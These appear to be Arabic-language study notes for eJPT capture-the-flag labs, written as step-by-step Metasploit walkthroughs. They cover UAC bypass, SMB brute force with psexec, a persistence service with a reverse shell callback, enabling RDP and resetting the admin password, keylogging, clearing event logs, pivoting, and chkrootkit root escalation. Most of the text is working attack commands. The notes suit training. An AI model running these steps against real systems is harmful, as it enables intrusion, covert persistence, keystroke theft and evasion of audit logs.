# Session 7 (ejpt) - Day 7
##  Host & Network Penetration Testing: The Metasploit Framework (MSF) part2


السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نبدا من الي وقفنا عليه امس  

---

راح نبداء باللاب الاول الي هو  

UAC Bypass: Memory Injection (Metasploit) 
-----------------------------------------|  

طبعا في هذا اللاب راح نتكلم عن احد الطرق في الـ Advance Privilege Escalation والي هو Windows: UAC Bypass  


طبعا الـ UAC Bypass يكون injection in dll  

خلونا نبدا  

طبعا زي مانشوف معطينا التارقت راح نفحصه بالـ nmpa  
```bash
nmap -sV -sC 10.0.23.239  
```  

طبعا زي مانشوف البورتات الفتوحه طبعا الي يهمنا منها بورت 80  

نشوف انه شغال عليه HTTPFileServer httpd 2.3  

وهذا السيرفر بهالاصدار مصاب زي مانعرف وسبق واستغليناه باداة الـ msfconsole  

راح نستغله الان بنفس الطريقه  
```bash
msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.0.23.239  
exploit  
```  

وزي مانشوف الان عطانا meterpreter session  

طيب خلونا نشوف ايش صلاحيتنا وايش اليوزر الي معنا عن طريق هذي الاوامر في الـ meterpreter session  
```bash
getuid [ to identify Server username ]  
sysinfo [ to list out information about target machine such as (OS , Architecture , Logged on Users etc...) ]  
```  

طبعا الان راح نحاول نرفع صلاحيتنا لكن بالاول راح نتوجه لبروسس اخر زي ماقلنا عشان الاتصال يكون مستقر ونبعد عن انه يقطع علينا الاتصال في اي لحظه  
```bash
ps -S explorer.exe [ to identify the process id  ]  
migrate $PID  [ to migrate to specific process via process id ]  
```  

حلو الان اتصالنا مستقر راح نجرب نرفع الصلاحيات عن طريق هذا الامر  
```bash
getsystem [ to elevate to the high privilege. ]  
```  

نشوف انه ماقدر يرفع صلاحياتنا , طيب خلونا بداية الان نشوف يوزرنا اصلا هل هو من ضمن قروب administrators او لا  

اول شي طبعا نفتح شيل وبعدها ننفذ الامر الي بيظهر لنا ايش اليوزرات الي من هذا القروب الي هو administrators  
```bash
shell [ to open shell ]  
net localgroup administrators [ to identify all users in administrators group ]  
```  

نشوف انه فعلا اليوزر الي معنا جزء من قروب administrators ف راح نحاول الان نرفع صلاحياتنا عن طريق Bypassing UAC(User Account Control)  

اول شي نخلي نطلع من الشيل بعدها نطلع من الـ meterpreter session ونخليها بالخلفيه عن طريق هذي الاوامر  
```bash
press (CTRL+C) [ to exit from shell ]
bg or background or press (CTRL + Z) [ to set the meterpreter session on backgrond (without closeing) ]  
```  

طبعا البايباس الي حاب يعرف عنه اكثر يقدر يقرا عنه من هنا
[Bypass_UAC](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/)  

طبعا الاستغلال هذا موجود له موديول على الـ msfconsole وراح نستعمله الان باذن الله  

```bash
use exploit/windows/local/bypassuac_injection  
set session 1  
set TARGET 1  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
exploit  
```  

نشوف الان انه عطانا meterpreter session ثانيه  

نشوف الان ناحاول نرفع صلاحياتنا بيوزر الـ admin عن طريق هذا الامر  
```bash
getsystem [ to elevate to the high privilege. ]  
getuid [ to identify Server username ]  
```  

زي مانشوف الان سوينا بايباس وقدرنا نرفع صلاحياتنا زي وصار معنا NT AUTHORITY\SYSTEM  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الثاني الي هو  

Exploiting SMB With PsExec 
--------------------------|  

طبعا الان راح نشوف طريقة استغلال الـ SMB عن طريق اداة اسمها psexec  

نشوف الان مع بعض معطينا التارقت راح نفحصه كالمعتاد  
```bash
nmap -sV -sC 10.0.0.242  
```  

نشوف الان ان بورت 445 شغال طبعا راح نسوي بروت فورس على اليوزر والباسورد  

تقدر تستخدم اي اداة تبيها hydar , metasploit etc..  

حنا راح نسويها باستخدام الـ metasploit  
```bash
msfconsole  
use auxiliary/scanner/smb/smb_login  
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt  
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
set RHOSTS 10.0.0.242  
set VERBOSE false  
exploit  
```  

نشوف انه عطانا اكثر من يوزر وباسورد الان بنستغله عن طريق موديول psexec  

```bash
use exploit/windows/smb/psexec  
set RHOSTS 10.0.0.242  
set SMBUser Administrator  
set SMBPass qwertyuiop  
exploit  
```  

نشوف انه فعلا عطانا الان الريفيرس شيل او بالاصح meterpreter session  

الان فقط مطلوب مننا نقرا الفلاق بهذي الطريقه  
```bash
shell  
cd /  
dir  
type flag.txt  
```  

طبعا الان معنا اعلى صلاحيات بالنظام بعد ما استغليناه عن طريق psexec  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الثالث الي هو  

Maintaining Access: Persistence Service 
---------------------------------------|  

طبعا في هذا اللاب راح نشوف اللاب مع بعض وهذا هو الـ Persistence عن طريق الـ Service  

طبعا زي العاده معطينا التارقت وراح نفحصه بالـ nmap  
```bash
nmap -sV -sC 10.0.25.204  
```  

طبعا نشوف ان بورت 80 مفتوح وشغال عليه HTTPFileServer 2.3 ونعرف انه مصاب راح نستغله مباشره  
```bash
msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.0.25.204  
set LHOST 10.10.1.2  [Enter your IP machine]  
exploit
```  

طبعا نشوف الان ايش الصلاحيات الي معنا او بالاصح ايش اليوزر الي معنا عن طريق هذا الامر  
```bash
getuid  
```  

نلاحظ انه معنا يوزر Administrator  

طبعا مصطلح Persistence انك تحاول متى ماحبيت تتصل بالتارقت يكون عندك القدرة انك تتصل  
بمعنى لو طفى جهاز التارقت واشتغل اكيد بنحتاج نعيد الاكسبلويت كامل لو استخدمت الـ Persistence وتكنيكاته ماراح تحتاج تعيد الاستغلال والطرق فيه كثيره لكن اليوم بنشوف وحده منهم  

طبعا راح نحاول نطبق هذا التكنيك عن طريق هذا الموديول وانه بيسوي لنا service جديده  

```bash
use exploit/windows/local/persistence_service  
set SESSION 1  
exploit  
```  

طبعا الان نشوف انه فعلا سوا لنا الخدمة وحقن فيها الشيل حقنا وجدولها انه مثلا تتصل كل دقيقه او كل يوم او اي وقت اخر  

راح نجرب الان نتصل عن طريق الخدمة الي سواها لنا الموديول الي فوق  

طبعا راح نتنصت على نفس البورت الي حقناه داخل الخدمة الي سويناها مسبقا  

```bash
msfconsole  
use exploit/multi/handler  
set LHOST 10.10.1.2  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LPORT 4444  
exploit  
```  

طبعا الان لابد يكون نفس المعلومات الي موجوده او الي اعطينها الموديول الي سوا لنا الـ Service  

راح نسوي reboot للمشين عشان نشوف هل فعلا بيجينا اتصال ولا لا  

```bash
session -i 1  
reboot  
```  

نشوف الان بالصفحة الثانيه الي فيها الـ multi/handler جانا اتصال ووضعنا تمام  

طبعا لو اكتشف الـ Persistence تبعك وحذفه التارقت راح يقطع اتصالك فحاول تختار الطريقة الي نادر انه ممكن يشك فيها الـ Administrator تبع النظام  


طبعا تقدر تسوي اكثر من تكنيك بنفس الوقت بحيث لو قفط وحده بيكون عندك طريقة اخرى وهكذا  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الرابع الي هو  

Windows: Enabling Remote Desktop 
---------------------------------|

طبعا هنا راح نشوف طريقة في حال كان معنا اتصال ونبي نفعل الـ RDP protocol ف هذي احدى الطرق  

اول شي راح نفحص التارقت بالـ nmap  
```bash
nmap -sV -sC 10.0.0.68  
```  

نشوف الان ان بورت 80 شغال وعليه خدمة BadBlue 2.7 وحنا نعرف انه مصاب راح نستغله  
```bash
msfconsole  
use exploit/windows/http/badblue_passthru  
set RHOSTS 10.0.0.68  
exploit  
```  

الان جانا الاتصال والوضع تمام  
الان بنحاول نفعل الـ RDP عن طريق موديول في الـ msfconsole  
طبعا نخلي السيشن الاولى في الخلفيه عن طريق
```bash
CTRL+Z or background or bg
```  

والان نجرب نفعل الـ RDP

```bash
use post/windows/manage/enable_rdp  
set SESSION 1  
exploit  
```  

نلاحظ انه قالنا انه POST module execution completed وهذا يعني انه فعل لنا الـ RDP  

خلونا نجرب نفحص 
```bash
nmap -sV -sC 10.0.0.68  
```  

ونشوف انه فعلا شغال  

طيب الان كيف راح نتصل بالـ RDP وحنا مامعنا username & password ?  
عندنا طرق كثير مثلا بروت فورس او hashdump وتسوي كراك او تسوي يوزر جديد  
وبحالتنا الافضل والاسرع انك تسوي يوزر جديد  

نفتح اول سيشن اخذناها ونسوي يوزر جديد عن طريق هذا الامر  
```bash
sessions -i 1 [to interact with session id 1]  
shell [to open shell on the target]  
net user administrator hacker_123321 [to create new user on windows system]  
```  

والان نشوف انه فعلا سوا لنااليوزر حقنا خلونا نجرب نتصل بالتارقت عن طريق RDP  
```bash
xfreerdp /u:administrator /p:hacker_123321 /v:10.0.0.68  
Y [when you get (Do you trust to above certificate?(Y/T/N)) type Y to trusted the certificate]  
```  


طبعا مطلوب مننا نقرا الفلاق راح نحصل الملف الي فيه الفلاق في سطح المكتب اسمه flag افتحه وبتحصل الفلاق  

الى هنا انتهى اللاب نشوف الي بعده 

---

راح نبداء باللاب الخامس الي هو  

Windows: File and Keylogging 
-----------------------------|  

طبعا هذا اللاب الهدف منه keylogger  

الـ keylogger هو يسجل اي ضغطه على الكيبورد ويعتبر فايروس طبعا هنا راح يكون سكربت او موديول جاهز لكن انت تقدر تكتبه سواء بالـ python , C etc...  

طبعا نشوف انه كلعاده معطينا التارقت نفحص ونستغل لانه مكرر الطريقه ف مباشره راح نفحص ونستغل بورت 80 لانه هو المصاب زي مانعرف  

```bash
nmap -sV -sC 10.0.0.71  
```  

نشوف انه الخدمة الشغاله Badblue 2.7 نستغلها  
```bash
msfconsole  
use exploit/windows/http/badblue_passthru  
set RHOSTS 10.0.0.71  
exploit  
```  

والان اخذنا الشيل وكلشي تمام طبعا مطلوب مننا الفلاق ف خل نقراه  
```bash
shell  
cd /  
dir  
type flag.txt  
```  

طبعا راح نسوي ملف نصي عن طريق امر echo بلغة bash عشان نسوي الملف ونكتب داخله نص  
```bash
cd Users\\Administrator\\Desktop  
dir  
echo “You have been Hacked” > hacked.txt  
```  

الان طبعا نروح على التارقت مشين ونشوف المسار الي حطينا فيه الملف راح نحصل الملف موجود  

طبعا لو فتحته راح تحصل نفس النص الي كتبناه فوق  

طبعا الان كيف بنسوي scan للـ kay ? فيه موديول راح يساعدنا بهذا الشي  

طبعا اولا لابد ننتقل على بروسس معين بحيث يكون الاتصال مستقر  
```bash
ps -S explorer.exe  
migrate 2724  
```  

نشوف الان انه انتقلنا على بروسس اخر راح الان نجرب نستخدم امر الـ keyscan عشان يبدا يلقط لنا اي ضغطه على الكيبورد على جهاز الـ Target machine  
```bash
keyscan_start [to capture keystrokes]  
```  

نرجع الان لنفس الملف الي سويناه في سطح المكتب اسمه hacked.txt ونجرب نكتب فيه اي شي ونشوف هل بيجينا وش قاعد يكتب التارقت او لا طبعا بعد مانكتب اي شي نروح للـ meterpreter shell ونسوي dump للضغطات الي انضغطت في جهاز التارقت  
```bash
keyscan_dump [to dump the keylogger data]  
```  

ونشوف انه فعلا عطانا كلشي انضغط على الكيبورد في الـ target machine  

الى هنا انتهى اللاب ننتقل للي بعده  

---

راح نبداء باللاب السادس الي هو  

Clearing Windows Event Logs 
-----------------------------|  

طبعا في هذا اللاب راح نشوف طريقة كيف نحذف الـ Even Logs  

طبعا اي سيرفر راح يكون فيه Logs واللوق هذا راح يكون فيه كلشي صار طبعا يعني من يوم يدخل الاتاكر الى ان يطلع واشياء زياده كلشييي مسجل حرفيا  

طبعا راح ناخذ امر وفايدته زي ماذكرنا انه يحذف لنا كل الـ Event Logs عن طريق امر معين  

خلونا اول شي نستغل الجهاز وندخل على التارقت  

بالبداية بنفحص كالعادة  
```bash
nmap -sC -sV 10.2.27.188  
```

طبعا شغال على بورت 80 شغال عليه خدمة BadBlue 2.7 ونعرف انه مصاب نستغله مباشرة  
```bash
msfconsole  
use exploit/windows/http/badblue_passthru  
set RHOSTS 10.2.27.188  
exploit  
```  

الان اخذنا الشيل الان كل الي علينا انه نكتب فقط هذا الامر الي موفرته لنا الـ meterpreter session  
```bash
clearev  
```  

ونشوف انه انحذف اللوقز طبعا لابد ماتسويها الا اذا مسموح لك كا pentester يعني  

نشوف الان اللاب الي بعده ومره مهم  

---

راح نبداء باللاب السابع الي هو  

Pivoting
---------|  

طبعا هنا راح نتكلم عن التمحور داخل الشبكة  

طبعا عندنا 2 تارقت  

طبعا توصل الاو ل تستغله وبعدها تفحص التارقت الثاني  

طبعا المفروض نفحص بالـ nmap ونشوف وش فيه التارقت 1 لكن بنختصر لانه مكرر ف بنستغل فورا  
```bash
msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.0.23.180  
exploit  
```  

الان جانا الـ meterpreter shell  

الان الي نحتاجه انه نعرف ايش هو ايبي الشبكة كامل ونظيفه بالـ route table  
```bash
shell  
ipconfig  
```  

الان نشوف انه عطانا ايبي الشبكة كامل زمن النت ماسك بنعرف الـ CIDR  
```bash
if ip = 10.0.23.180  
netmask = 255.255.240.0  
the IP network = 10.0.23.0/20  
```  

والان نضيفه الى الـ route table عن طريق هذا الامر  
```bash
run autoroute -s 10.0.23.0/20  
```  

طبعا الان اضفناه الى الـ route table  

طبعا بنسوي portscan عشان نشوف ايش الايبي الـ up وايش البورتات الشغاله عليه  

نخلي السيشن في الخلفيه ونستخدم الموديول التالي  
```bash
background  
use auxiliary/scanner/portscan/tcp  
set RHOSTS 10.0.27.99  
set PORTS 1-100  
exploit  
```  

طبعا حصلنا ان بورت 80 شغال طبعا الان لابد نسوي شي اسمه port forward بحيث نقدر او يصير عندنا access على البورت  

طيب بنشوف الان كيف بنسويها بداية راح نرجع لسيشن حقتنا  
```bash
sessions -i 1  
portfwd add -l 1234 -p 80 -r 10.0.27.99 [-l $attacker_port -p $target_port -r $ip_target]  
portfwd list  [to check Active Port forwards]
```  

طبعا الان نشوف انه باللوكال بورت 1234 راح يودينا عليه 10.0.27.99 بالتحديد بورت 80  

راح نجرب نفحص الان البورت على الـ local  
```bash
nmap -sV -sS -p 1234 localhost  
```  

نشوف الان انه الان بورت 1234 على جهازنا شغال عليه BadBlue لكن بالواقع هو مش بورت 1234 ولا هو حقنا بس عكسنا البورت بحيث انه الان الايبي 10.0.27.99 بالتحديد بورت 80 شغال عليه BadBlue 2.7 وحنا نعرف انه مصاب وله استغلال راح نستغله طبيعي الان  
```bash
msfconsole  
use exploit/windows/http/badblue_passthru  
set PAYLOAD windows/meterpreter/bind_tcp  
set RHOSTS 10.0.27.99  
exploit  
``` 

طبعا لابد يكون الـ payload bind_tcp والفرق بين البايند والريفيرس  

البايند = حنا نتصل بالتارقت  
الريفيرس = التارقت يتصل فينا  


والان نشوف انه تم الاستغلال المطلوب مننا فقط نقرا الفلاق  
```bash
shell
cd /  
dir  
type flag.txt  
```  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الثامن الي هو  

Linux: Post Exploitation Lab I
------------------------------|  

طبعا في هذا اللاب راح نتكلم عن ايش ممكن تسوي بعد ماتستغل المشين بالتحديد اذا كانت لينكس مشين  

راح نشوف بعض الموديول الي راح تساعدنا او تخدمنا في هذا  

طبعا فيه اداة اسمها linpeas تسوي لك كلشي حرفيا بامر واحد ف مايحتاج تستخدم موديولز كثيره  

لكن الان بنتبع الطريقه المشروحه وهي metasploit modules  

راح نفحص التارقت اول طبعا يانفحص كامل الشبكة او ناخذ اخر ديجت ونزود 1 كاختصار  
```bash
nmap -sS -sV -p- 192.162.5.3  
```  

طبعا نعرف ان الـ samba هنا مصاب ف نستغل مباشرة لانه متكرر  
```bash
msfconsole  
use exploit/linux/samba/is_known_pipename  
set RHOST 192.162.5.3  
check
exploit  
```  

طبعا الان اخذنا الشيل الان راح نبدا نستخدم الموديولز الي بتساعدنا بجمع المعلومات عن التارقت مشين  

اول شي نخلي السيشن بالخلفيه  
```bash
bg or background or press [CTRL + Z]  
```  

اول موديول راح ناخذه الي هو  
```bash
use post/linux/gather/enum_configs  
set SESSION 1  
run  
```  

طبعا نشوف انه عطانا معلةمات مثل انه Debian GNU/Linux 8 ومعلومات ثانيه ممكن تفيدنا كثير بتصعيد الصلاحيات  

نشوف الموديول الثاني  
```bash
use post/linux/gather/checkcontainer  
set SESSION 1  
run  
```  

طبعا هذا الموديول بيعلمك اذا كنت داخل doker او لا ونشوف انه قالنا انه فعلا حنا داخل doker  

طبعا باقي الموديول نفس الطريقة راح اترك لكم ليسته تجربونها لحالكم  

```bash
post/linux/gather/enum_configs  
post/multi/gather/env  
post/linux/gather/enum_network  
post/linux/gather/enum_protections  
post/linux/gather/enum_system  
post/linux/gather/checkcontainer  
post/linux/gather/checkvm  
post/linux/gather/enum_users_history  
post/multi/manage/system_session  
post/linux/manage/download_exec  
```  

الى هنا انتهى اللاب نشوف الي بعدها  

---

راح نبداء باللاب الثامن الي هو  

Privilege Escalation - Rootkit Scanner
---------------------------------------|  

طبعا في هذا اللاب معنا يوزر وباسورد وقال سجل عن طريق الـ SSH ف فورا راح نسويها مايحتاج نفحص 

التارقت طبعا يانفحص كامل الشبكة او ناخذ اخر ديجت ونزود 1 كاختصار  

```bash
SSH Login Credentials:

| Username: jackie |Passowrd: password |  
```  

طبعا راح نشبك الـ SSH عن طريق الـ metasploit  
```bash
use auxiliary/scanner/ssh/ssh_login  
set RHOSTS 192.14.195.3  
set USERNAME jackie  
set PASSWORD password  
exploit  
```  

طبعا الان بنشبك على الـ session الي سواها لنا  
```bash
sessions -i 1  
```  

الان بنفذ امر الي هو 
```bash
ps aux  
```  
طبعا وظيفة هذا الامر يعرض لك البروسس الي شغاله حاليا ويعطيك عنها تفاصيل كثيره  

نشوف انه شغال cron job الي هي check-down ف خلونا نشوف وش داخلها  
```bash
cat /bin/check-down  
```  

طبعا الان نشوف انه يشغل شي اسمه chkrootkit ويحط المخرجات في /dev/null كل 60 ثانيه  

ف انت تروح تبحث ايش هو ال chkrootkit وراح تعرف اصداره عن طريق هذا الامر   
```bash
/bin/chkrootkit -v  
```  

ونشوف انه اصداره 0.49 راح نبحث وبنحصل له اكسبلويت سواء في google , searchsploit etc...  

راح نستغله عن طريق الـ metasploit  
```bash
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit  
set session 1  
set LHOST 192.14.195.2  
exploit  
```  

الان استغليناه وكلشي تمام وصار معنا اعلى صلاحيات في اللينكس والي هي الـ root privileges  
مطلوب مننا نقرا الفلاق  
```bash
cat /root/flag  
```  

وبكذا اخذنا الفلاق وانتهى اللاب  

بكرا باذن الله باقي لنا لابين في هذا القسم وراح ندخل قسم جديد  

---  

## Follow us on:  
Twitter:  [s4cript](https://twitter.com/s4cript) , [cyberhub](https://twitter.com/cyberhub) , [0xNawaF1](https://twitter.com/0xNawaF1)